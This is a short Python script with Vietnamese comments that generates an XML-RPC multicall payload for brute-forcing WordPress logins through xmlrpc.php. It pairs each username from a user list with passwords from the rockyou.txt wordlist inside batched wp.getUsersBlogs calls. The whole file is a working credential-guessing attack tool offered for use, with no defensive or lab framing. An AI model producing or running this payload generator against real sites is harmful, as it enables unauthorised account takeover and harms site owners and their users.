# -*- coding: utf-8 -*-
# Script tạo payload.xml cho brute-force xmlrpc.php (multicall)
# Người dùng nhập file user.txt và rockyou.txt

def create_payload(users, passwords, output_file="payload.xml", max_per_user=5):
    header = '<?xml version="1.0"?>\n<methodCall>\n  <methodName>system.multicall</methodName>\n  <params>\n    <param>\n      <value>\n        <array>\n          <data>\n'
    footer = '          </data>\n        </array>\n      </value>\n    </param>\n  </params>\n</methodCall>\n'

    entries = ""
    for user in users:
        count = 0
        for password in passwords:
            if count >= max_per_user:
                break
            entry = f"""
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>{user}</string></value>
                        <value><string>{password}</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>"""
            entries += entry
            count += 1

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(header + entries + "\n" + footer)

    print(f"[+] Payload đã được tạo và lưu vào {output_file}")


if __name__ == "__main__":
    user_file = input("Nhập đường dẫn file user.txt: ").strip()
    pass_file = input("Nhập đường dẫn file rockyou.txt: ").strip()
    output_file = input("Nhập tên file output (mặc định payload.xml): ").strip() or "payload.xml"

    max_per_user = input("Số mật khẩu tối đa mỗi user (mặc định 5): ").strip()
    max_per_user = int(max_per_user) if max_per_user.isdigit() else 5

    with open(user_file, "r", encoding="utf-8") as f:
        users = [line.strip() for line in f if line.strip()]

    with open(pass_file, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f if line.strip()]

    create_payload(users, passwords, output_file, max_per_user)
